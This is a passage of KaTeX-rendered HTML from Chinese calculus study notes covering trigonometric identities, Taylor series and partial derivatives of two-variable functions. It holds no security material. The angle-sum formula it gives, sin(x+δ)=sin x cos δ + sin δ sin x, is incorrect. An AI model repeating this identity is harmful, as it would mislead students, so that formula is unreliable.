mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mop">ln</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></li></ul></li></ul><blockquote><p>两角和公式：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>sin</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mi>δ</mi><mo stretchy="false">)</mo><mo>=</mo><mi>sin</mi><mo>⁡</mo><mi>x</mi><mi>cos</mi><mo>⁡</mo><mi>δ</mi><mo>+</mo><mi>sin</mi><mo>⁡</mo><mi>δ</mi><mi>sin</mi><mo>⁡</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">\sin(x+\delta)=\sin{x}\cos{\delta}+\sin{\delta}\sin{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">sin</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mop">sin</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">cos</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mop">sin</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">sin</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span></span></span><br />三角和差化积：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>cos</mi><mo>⁡</mo><mi>x</mi><mo>−</mo><mn>1</mn><mo>=</mo><mo>−</mo><mn>2</mn><msup><mo><mi>sin</mi><mo>⁡</mo></mo><mn>2</mn></msup><mfrac><mi>x</mi><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\cos{x}-1=-2\sin^2{\frac{x}{2}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mop">cos</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2168679999999998em;vertical-align:-0.345em;"></span><span class="mord">−</span><span class="mord">2</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">sin</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.871868em;"><span style="top:-3.12076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p></blockquote><h3 id="泰勒级数"><a class="markdownIt-Anchor" href="#泰勒级数"></a> 泰勒级数</h3><ul><li>泰勒级数是对函数进行高阶逼近。如果一个函数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span>是n阶可微函数，那么</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>0</mn></msub><mo>+</mo><mi mathvariant="normal">Δ</mi><mo stretchy="false">)</mo><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mo>+</mo><msup><mi>f</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">(</mo><msub><mi>x</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mo>⋅</mo><mi mathvariant="normal">Δ</mi><mo>+</mo><mfrac><mrow><msup><mi>f</mi><mrow><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">(</mo><msub><mi>x</mi><mn>0</mn></msub><mo stretchy="false">)</mo></mrow><mn>2</mn></mfrac><mo>⋅</mo><msup><mi mathvariant="normal">Δ</mi><mn>2</mn></msup><mo>+</mo><mo>⋯</mo><mo>+</mo><mfrac><mrow><msup><mi>f</mi><mrow><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">(</mo><msub><mi>x</mi><mn>0</mn></msub><mo stretchy="false">)</mo></mrow><mrow><mi>n</mi><mo stretchy="false">!</mo></mrow></mfrac><mo>⋅</mo><msup><mi mathvariant="normal">Δ</mi><mi>n</mi></msup><mo>+</mo><mi>o</mi><mo stretchy="false">(</mo><msup><mi mathvariant="normal">Δ</mi><mi>n</mi></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x_0+\Delta)=f(x_0)+f&#x27;(x_0)\cdot\Delta+\frac{f^{(2)}(x_0)}{2}\cdot\Delta^2+\dots+\frac{f^{(n)}(x_0)}{n!}\cdot\Delta^n+o(\Delta^n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">Δ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.051892em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord">Δ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.251em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.565em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight">2</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">Δ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.251em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.565em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">n</span><span class="mclose">!</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">n</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7977219999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">Δ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">o</span><span class="mopen">(</span><span class="mord"><span class="mord">Δ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><ul><li>函数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span>的n阶Taylor级数就是与<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span>拥有相同前n阶导数的n阶多项式。</li></ul><h3 id="多元函数和梯度"><a class="markdownIt-Anchor" href="#多元函数和梯度"></a> 多元函数和梯度</h3><h4 id="从低维到高维"><a class="markdownIt-Anchor" href="#从低维到高维"></a> 从低维到高维</h4><ul><li>对于二院函数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x,y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span>，偏导数的定义为</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="normal">∂</mi><mi>x</mi></msub><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><mo>=</mo><mfrac><mi mathvariant="normal">∂</mi><mrow><mi mathvariant="normal">∂</mi><mi>x</mi></mrow></mfrac><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><msub><mi mathvariant="normal">Δ</mi><mi>x</mi></msub><mo>→</mo><mn>0</mn></mrow></munder><mfrac><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><msub><mi mathvariant="normal">Δ</mi><mi>x</mi></msub><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>−</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><msub><mi mathvariant="normal">Δ</mi><mi>x</mi></msub></mfrac></mrow><annotation encoding="application/x-tex">\partial_x{f(x,y)}=\frac{\partial}{\partial x}f(x,y)= \lim_{\Delta_x\rightarrow 0}\frac{f(x+\Delta_x,y)-f(x,y)}{\Delta_x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.05556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.05744em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.37144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathdefault">x</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.2714309999999998em;vertical-align:-0.8444309999999999em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-2.055669em;margin-left:0em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">Δ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mrel mtight">→</span><span class="mord mtight">0</span></span></span></span><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span><span class="mop">lim</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8444309999999999em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.3139999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">Δ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord">Δ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8360000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="normal">∂</mi><mi>y</mi></msub><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><mo>=</mo><mfrac><mi mathvariant="normal">∂</mi><mrow><mi mathvariant="normal">∂</mi><mi>y</mi></mrow></mfrac><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><msub><mi mathvariant="normal">Δ</mi><mi>y</mi></msub><mo>→</mo><mn>0</mn></mrow></munder><mfrac><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo>+</mo><msub><mi mathvariant="normal">Δ</mi><mi>y</mi></msub><mo stretchy="false">)</mo><mo>−</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><msub><mi mathvariant="normal">Δ</mi><mi>y</mi></msub></mfrac></mrow><annotation encoding="application/x-tex">\partial_y{f(x,y)}=\frac{\partial}{\partial y}f(x,y)= \lim_{\Delta_y\rightarrow 0}\frac{f(x,y+\Delta_y)-f(x,y)}{\Delta_y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.25188em;vertical-align:-0.8804400000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.37144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3.23em;"><span class="pstrut" 